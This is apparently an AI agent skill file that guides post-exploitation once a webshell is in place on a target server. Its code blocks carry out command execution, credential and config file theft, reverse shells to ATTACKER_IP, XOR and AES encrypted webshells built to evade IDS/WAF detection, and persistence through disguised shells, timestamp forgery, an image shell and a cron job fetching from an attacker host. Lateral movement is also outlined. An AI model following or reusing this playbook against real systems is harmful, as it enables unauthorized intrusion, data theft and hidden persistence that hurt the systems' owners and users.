---
name: webshell-management
description: "CLI interaction and deep exploitation after webshell deployment. Use once a webshell has been uploaded successfully and you need to execute commands via curl/python, transfer files, establish encrypted communication, bypass disable_functions/open_basedir, or establish persistence. This skill complements webshell-deploy — deploy handles generating and uploading the webshell, while this skill handles every operation after a successful upload. Pure command-line operation, no GUI tools required"
zh-signals: "Webshell 部署后的命令行交互与深度利用，涵盖命令执行、文件传输与权限维持。信号:Webshell,命令行交互,命令执行,加密通信,权限维持,绕过"
when-to-use: "Use after a webshell has been uploaded and CLI-based interaction, command execution, file transfer, or persistence is needed."
metadata:
  tags: "webshell,interaction,curl,encrypted shell,disable_functions,open_basedir,persistence,file operations,information gathering"
  category: "exploit"
---

# CLI Operations After Webshell Deployment

> **Prerequisites**: The webshell has been deployed to the target. This skill focuses on CLI interaction and management operations after deployment.

## Phase 1: curl Interaction

### 1.1 Command Execution

```bash
# system() type: <?php system($_POST['c']);?>
curl -s -d "c=id" http://TARGET/shell.php
curl -s --data-urlencode "c=cat /etc/passwd" http://TARGET/shell.php

# eval() type: <?php eval($_POST['c']);?>
curl -s -d "c=system('id');" http://TARGET/shell.php
curl -s -d "c=echo file_get_contents('/etc/passwd');" http://TARGET/shell.php

# GET parameter type: <?php system($_GET['c']);?>
curl -s "http://TARGET/shell.php?c=id"
```

### 1.2 File Operations

```bash
# Read a file
curl -s -d "c=echo file_get_contents('/etc/passwd');" http://TARGET/shell.php

# Write a file (deploy a second webshell)
curl -s --data-urlencode "c=file_put_contents('/var/www/html/.config.php','<?php system(\$_POST[\"x\"]);?>');" http://TARGET/shell.php

# Download a file to the attacker machine (base64 transfer avoids binary issues)
curl -s -d "c=echo base64_encode(file_get_contents('/app/config/database.yml'));" http://TARGET/shell.php | base64 -d > database.yml

# Upload a file to the target
B64=$(base64 -w0 local_tool.elf)
curl -s --data-urlencode "c=file_put_contents('/tmp/tool',base64_decode('$B64'));chmod('/tmp/tool',0755);" http://TARGET/shell.php

# Search for sensitive files
curl -s -d "c=system('find / -name \"*.conf\" -o -name \".env\" -o -name \"*password*\" 2>/dev/null | head -20');" http://TARGET/shell.php
```

### 1.3 Information Gathering

```bash
# System information
curl -s -d "c=system('uname -a; id; hostname; ip addr');" http://TARGET/shell.php

# Internal network probing
curl -s -d "c=system('cat /etc/hosts; arp -a; ip route');" http://TARGET/shell.php

# Database credential search
curl -s -d "c=system('find / -name \"*.php\" -exec grep -l \"mysql_connect\|mysqli\|PDO\" {} \; 2>/dev/null | head -10');" http://TARGET/shell.php

# PHP configuration
curl -s -d "c=phpinfo();" http://TARGET/shell.php | grep -i "document_root\|server_addr\|disable_functions"
```

### 1.4 Reverse Interactive Shell

A webshell is unstable and limited, so upgrade to an interactive shell as soon as possible:

```bash
# bash reverse shell
curl -s --data-urlencode "c=system('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"');" http://TARGET/shell.php

# python reverse shell
curl -s --data-urlencode "c=system('python3 -c \"import os,socket,subprocess;s=socket.socket();s.connect((\\\"ATTACKER_IP\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"bash\\\",\\\"-i\\\"])\"');" http://TARGET/shell.php

# Outbound restricted — probe reachable egress ports
for port in 80 443 53 8080 8443; do
  curl -s --data-urlencode "c=system('timeout 2 bash -c \"echo >/dev/tcp/ATTACKER_IP/$port\" 2>&1 && echo \"$port OPEN\" || echo \"$port CLOSED\"');" http://TARGET/shell.php
done
```

## Phase 2: Encrypted Communication

Plaintext webshell traffic is easily detected by IDS/WAF. After deploying an encrypted shell, interact through the Python client.

### 2.1 XOR Encryption (Server + Client)

```php
<?php
// Server: xshell.php
$key = 'k3y_s3cr3t';
$data = file_get_contents('php://input');
$decoded = '';
for($i=0; $i<strlen($data); $i++){
    $decoded .= $data[$i] ^ $key[$i % strlen($key)];
}
ob_start(); eval($decoded); $result = ob_get_clean();
$encrypted = '';
for($i=0; $i<strlen($result); $i++){
    $encrypted .= $result[$i] ^ $key[$i % strlen($key)];
}
echo $encrypted;
?>
```

```python
#!/usr/bin/env python3
"""XOR webshell CLI client"""
import requests, sys

URL = "http://TARGET/xshell.php"
KEY = b"k3y_s3cr3t"

def xor_crypt(data: bytes) -> bytes:
    return bytes([data[i] ^ KEY[i % len(KEY)] for i in range(len(data))])

def execute(cmd: str) -> str:
    payload = f"system('{cmd}');"
    r = requests.post(URL, data=xor_crypt(payload.encode()),
                      headers={"Content-Type": "application/octet-stream"})
    return xor_crypt(r.content).decode(errors='replace')

if __name__ == "__main__":
    while True:
        cmd = input("shell> ").strip()
        if cmd in ('exit','quit'): break
        print(execute(cmd))
```

### 2.2 AES Encryption (Server + Client)

```php
<?php
// Server: ashell.php — AES-128-CBC
$key = md5('my_secret_key_1');
$iv = substr($key, 0, 16);
$data = file_get_contents('php://input');
$decrypted = openssl_decrypt($data, 'AES-128-CBC',
    hex2bin($key), OPENSSL_RAW_DATA, $iv);
ob_start(); eval($decrypted); $result = ob_get_clean();
$encrypted = openssl_encrypt($result, 'AES-128-CBC',
    hex2bin($key), OPENSSL_RAW_DATA, $iv);
echo base64_encode($encrypted);
?>
```

```python
#!/usr/bin/env python3
"""AES webshell CLI client"""
import requests, hashlib, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

URL = "http://TARGET/ashell.php"
KEY = bytes.fromhex(hashlib.md5(b'my_secret_key_1').hexdigest())
IV = KEY[:16]

def execute(cmd: str) -> str:
    payload = f"system('{cmd}');".encode()
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    encrypted = cipher.encrypt(pad(payload, 16))
    r = requests.post(URL, data=encrypted,
                      headers={"Content-Type": "application/octet-stream"})
    cipher2 = AES.new(KEY, AES.MODE_CBC, IV)
    return unpad(cipher2.decrypt(base64.b64decode(r.text)), 16).decode(errors='replace')

if __name__ == "__main__":
    while True:
        cmd = input("shell> ").strip()
        if cmd in ('exit','quit'): break
        print(execute(cmd))
```

## Phase 3: Bypass PHP Restrictions

> Only perform quick detection here; after confirming that a bypass is needed, refer to the specific bypass techniques.

```bash
# Check disable_functions
curl -s -d "c=echo ini_get('disable_functions');" http://TARGET/shell.php

# Check open_basedir
curl -s -d "c=echo ini_get('open_basedir');" http://TARGET/shell.php

# If restrictions exist → refer to Phase 1/Phase 2 of the php-bypass skill to execute the bypass
```

## Phase 4: Persistence

```bash
# Multi-location webshell (different paths, different passwords, disguised filenames)
curl -s --data-urlencode "c=file_put_contents('/var/www/html/css/style.php','<?php \$_GET[\"f\"](\$_GET[\"c\"]);?>');" http://TARGET/shell.php

# Timestamp camouflage (consistent with the normal files in the same directory)
curl -s -d "c=system('touch -r /var/www/html/index.php /var/www/html/css/style.php');" http://TARGET/shell.php

# Image shell (appended to a normal image + .htaccess parsing)
curl -s --data-urlencode "c=file_put_contents('/var/www/html/img/.htaccess','AddType application/x-httpd-php .jpg');" http://TARGET/shell.php
curl -s --data-urlencode "c=system('echo \"<?php system(\\\$_GET[c]);?>\" >> /var/www/html/img/logo.jpg');" http://TARGET/shell.php

# cron persistence
curl -s --data-urlencode "c=system('(crontab -l 2>/dev/null; echo \"*/5 * * * * curl http://ATTACKER/shell.php -o /var/www/html/.bak.php\") | crontab -');" http://TARGET/shell.php
```

## Decision Tree

```
The webshell is deployed (completed by webshell-deploy)
├── Confirm the shell type (system type / eval type) → Phase 1.1 test
├── Check environment restrictions
│   ├── disable_functions → Phase 3.1 LD_PRELOAD/FFI bypass
│   ├── open_basedir → Phase 3.2 glob/chdir bypass
│   └── WAF detects the traffic → Phase 2 deploy an XOR/AES encrypted shell
├── Information gathering → Phase 1.3 (system/network/database credentials)
├── Attempt a reverse shell → Phase 1.4
│   ├── Outbound open → bash/python reverse shell
│   └── Outbound restricted → scan reachable egress ports / keep using the webshell
├── Persistence → Phase 4
│   ├── Multi-location webshell + timestamp camouflage
│   └── Java target → in-memory shell (→ ../webshell-deploy/references/memory-webshell.md)
└── Lateral movement → internal network probing + database credentials + port forwarding
```
